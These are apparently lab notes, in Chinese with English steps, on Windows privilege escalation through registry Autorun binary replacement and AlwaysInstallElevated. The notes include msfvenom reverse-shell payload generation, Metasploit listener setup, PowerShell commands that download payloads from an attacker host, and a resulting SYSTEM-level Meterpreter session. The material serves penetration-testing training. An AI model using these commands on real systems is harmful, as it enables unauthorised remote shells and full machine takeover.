
# rdp连接
user登录
> rdesktop -u user -p password321 10.10.86.123 -r sound:on -g workarea

TCM登录
> rdesktop -u TCM -p Hacker123 10.10.86.123 -r sound:on -g workarea

# 1.注册表提权-自动运行（ Registry Escalation - Autorun）

## 前提
1. Autorun文件可写（可替换）
2. 需要另一个用户登录才会触发

## 思路
Autorun，就是启动时自动运行，这个思路时通过修改注册表里的二进制文件（用msfvenom生成一个同名的反弹shell文件），替换原有的二进制文件。当其他用户登录系统时，触发注册表里的Autorun文件，从而执行我们替换的payload，然后我们就得到了登录用户的权限。


## 怎么利用?

靶机：
1. 运行Autoruns64.exe检查自动运行的文件。（Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe）
2. 点击登录选项（In Autoruns, click on the ‘Logon’ tab.）
3. 在显示的结果当中，留意“我的程序”指向的二进制文件。（From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.）
4. 用accesschk64.exe检查这个Autorun文件的读写权限。（ In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"）
5. 从上面的检查结果中可以知道所有人对这个Autorun文件有读写权限（From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.）

攻击机：
监听
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

用msfvenom编译同名Autorun文件：

> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.21.169 lport=4444 -f exe -o program.exe


从靶机下载文件program.exe
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/program.exe','C:\Program Files\Autorun Program\program.exe')"

等待用户登录，触发反弹shell。


# 2.注册表提权-AlwaysInstallElevated (Registry Escalation - AlwaysInstallElevated)

## 前提
如果注册表里查询到这两个属性的值都是 0x1，那么任何用户都拥有以``` NT AUTHORITY\SYSTEM```身份运行或者安装```*.msi```文件的权限
>  reg query HKLM\Software\Policies\Microsoft\Windows\Installer
>  reg query HKCU\Software\Policies \Microsoft\Windows\Installer

## 思路
用msfvenom生成一个```*.msi```文件，在靶机里执行这个文件，就可以提权到```NT AUTHORITY\SYSTEM```

## 怎么利用?

### 攻击机：
监听
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

6. 生成反弹的.msi文件
> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.21.169 lport=4444 -f msi -o setup.msi

### 靶机：
7. 从靶机下载文件
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/setup.msi','C:\temp\setup.msi')"

8. 执行```setup.msi```文件

攻击机收到反弹shell，拿到最高权限
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending stage (175174 bytes) to 10.10.86.123
[*] Meterpreter session 2 opened (10.13.21.169:4444 -> 10.10.86.123:49329) at 2021-11-15 09:22:26 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```